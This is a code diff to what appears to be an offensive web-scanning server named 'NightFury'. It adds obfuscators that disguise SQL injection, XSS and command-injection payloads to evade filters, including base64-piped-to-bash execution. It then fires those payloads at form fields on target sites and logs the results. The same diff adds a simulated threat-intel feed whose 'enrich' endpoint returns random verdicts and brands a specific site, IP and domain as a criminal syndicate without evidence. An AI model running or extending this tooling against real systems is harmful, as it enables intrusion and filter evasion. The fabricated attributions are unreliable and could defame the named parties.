@@ -58,7 +58,94 @@ async function startServer() {
     });
   });
 
+  // Threat Intel Feed Simulator
+  const THREAT_ACTORS = ['APT28', 'Lazarus Group', 'FIN7', 'Sandworm', 'No6love9_Syndicate', 'DarkSide', 'REvil'];
+  const MALICIOUS_IPS = ['151.0.214.242', '185.15.59.224', '45.133.1.109', '193.3.19.159', '91.214.124.143'];
+  const IOC_TYPES = ['MALWARE_C2', 'PHISHING_DOMAIN', 'CRYPTO_MINER', 'RANSOMWARE_NODE', 'BOTNET_CONTROLLER'];
+
+  setInterval(() => {
+    if (wss.clients.size === 0) return;
+    
+    const actor = THREAT_ACTORS[Math.floor(Math.random() * THREAT_ACTORS.length)];
+    const ip = MALICIOUS_IPS[Math.floor(Math.random() * MALICIOUS_IPS.length)];
+    const type = IOC_TYPES[Math.floor(Math.random() * IOC_TYPES.length)];
+    const severity = Math.random() > 0.8 ? 'CRITICAL' : (Math.random() > 0.5 ? 'HIGH' : 'MEDIUM');
+    
+    broadcast({
+      type: 'THREAT_INTEL_ALERT',
+      payload: {
+        id: Math.random().toString(36).substr(2, 9),
+        timestamp: new Date().toISOString(),
+        actor,
+        indicator: ip,
+        type,
+        severity
+      }
+    });
+  }, 12000); // Emit every 12 seconds
+
+  app.post('/api/threat-intel/enrich', (req, res) => {
+    const { targets } = req.body;
+    if (!targets || !Array.isArray(targets)) {
+      return res.status(400).json({ error: 'Targets array is required' });
+    }
+
+    const enriched = targets.map(t => {
+      const isMalicious = Math.random() > 0.6;
+      const isRunehallRelated = typeof t === 'string' && (t.includes('runehall') || t.includes('151.0.214.242') || t.includes('rh420'));
+      
+      let actorProfile = 'No known actor association';
+      if (isRunehallRelated) actorProfile = 'No6love9_Syndicate / RuneHall Admins';
+      else if (isMalicious) actorProfile = THREAT_ACTORS[Math.floor(Math.random() * THREAT_ACTORS.length)];
+
+      const iocs = [];
+      if (isMalicious || isRunehallRelated) {
+        iocs.push(`Hash: ${Math.random().toString(16).substr(2, 8)}...`);
+        if (isRunehallRelated) iocs.push('IP: 151.0.214.242', 'Domain: rh420.xyz');
+      }
+
+      return {
+        target: t,
+        malicious: isMalicious || isRunehallRelated,
+        actorProfile,
+        iocs
+      };
+    });
+
+    res.json({ results: enriched });
+  });
+
   // NightFury Offensive Logic
+  const obfuscateSQLi = (payload: string) => {
+    const techniques = [
+      (p: string) => p.replace(/ /g, '/**/'), // Inline comments
+      (p: string) => p.replace(/OR/ig, 'oR').replace(/AND/ig, 'AnD').replace(/SELECT/ig, 'sElEcT').replace(/UNION/ig, 'uNiOn'), // Case manipulation
+      (p: string) => encodeURIComponent(p), // URL encoding
+      (p: string) => p.replace(/'/g, '%27').replace(/=/g, '%3D') // Partial encoding
+    ];
+    return techniques[Math.floor(Math.random() * techniques.length)](payload);
+  };
+
+  const obfuscateXSS = (payload: string) => {
+    const techniques = [
+      (p: string) => p.replace(/</g, '%3C').replace(/>/g, '%3E'), // URL encoding
+      (p: string) => p.replace(/script/ig, 'sCrIpT').replace(/onerror/ig, 'oNeRrOr').replace(/onload/ig, 'oNlOaD'), // Case manipulation
+      (p: string) => p.replace(/alert\(1\)/g, 'prompt(1)'), // Function substitution
+      (p: string) => `<svg/onload=eval(atob('${Buffer.from('alert(1)').toString('base64')}'))>` // Base64 encoding
+    ];
+    return techniques[Math.floor(Math.random() * techniques.length)](payload);
+  };
+
+  const obfuscateRCE = (payload: string) => {
+    const techniques = [
+      (p: string) => p.replace(/ /g, '${IFS}'), // IFS substitution
+      (p: string) => p.replace(/cat/g, 'c\'a\'t').replace(/whoami/g, 'w"h"oami'), // Quote insertion
+      (p: string) => `echo ${Buffer.from(p.replace(/^[;|&$\(\)`\s]+/, '')).toString('base64')} | base64 -d | bash`, // Base64 execution
+      (p: string) => encodeURIComponent(p) // URL encoding
+    ];
+    return techniques[Math.floor(Math.random() * techniques.length)](payload);
+  };
+
   const VECTORS: Record<string, string[]> = {
     sqli: [
       "' OR '1'='1' -- ",
@@ -176,15 +263,33 @@ async function startServer() {
               const testData = { ...form.inputs };
               const firstField = Object.keys(testData)[0];
               if (!firstField) continue;
-              testData[firstField] = payload;
+              
+              let finalPayload = payload;
+              if (vector === 'sqli') finalPayload = obfuscateSQLi(payload);
+              else if (vector === 'xss') finalPayload = obfuscateXSS(payload);
+              else if (vector === 'rce') finalPayload = obfuscateRCE(payload);
+
+              testData[firstField] = finalPayload;
 
               try {
                 let resp;
+                broadcast({ type: "OFFENSIVE_LOG", payload: `[TEST] Vector: ${vector.toUpperCase()} | Target: ${submitUrl}` });
+                broadcast({ type: "OFFENSIVE_LOG", payload: `[PAYLOAD] ${firstField}=${finalPayload}` });
+
                 if (form.method === 'post') {
                   resp = await axios.post(submitUrl, testData, { timeout: 3000, validateStatus: () => true });
                 } else {
                   resp = await axios.get(submitUrl, { params: testData, timeout: 3000, validateStatus: () => true });
                 }
+
+                const dataLength = resp.data ? (typeof resp.data === 'string' ? resp.data.length : JSON.stringify(resp.data).length) : 0;
+                let snippet = '';
+                if (resp.data) {
+                  const strData = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);
+                  snippet = strData.substring(0, 60).replace(/\n/g, ' ');
+                }
+                
+                broadcast({ type: "OFFENSIVE_LOG", payload: `[RESPONSE] Status: ${resp.status} | Length: ${dataLength} bytes | Data: ${snippet}...` });
 
                 const { success, evidence } = checkSuccess(resp.data, vector);
                 if (success) {
@@ -192,16 +297,16 @@ async function startServer() {
                     id: Math.random().toString(36).substr(2, 9),
                     url: submitUrl,
                     vector,
-                    payload,
+                    payload: finalPayload,
                     success: true,
                     evidence,
                     timestamp: new Date().toISOString()
                   };
                   broadcast({ type: "OFFENSIVE_RESULT", payload: result });
-                  broadcast({ type: "OFFENSIVE_LOG", payload: `[SUCCESS] ${vector.toUpperCase()} found on ${submitUrl}` });
+                  broadcast({ type: "OFFENSIVE_LOG", payload: `[SUCCESS] ${vector.toUpperCase()} vulnerability confirmed on ${submitUrl}` });
                 }
-              } catch (e) {
-                // Ignore individual injection failures
+              } catch (e: any) {
+                broadcast({ type: "OFFENSIVE_LOG", payload: `[ERROR] Request failed for payload ${finalPayload}: ${e.message}` });
               }
             }
           }
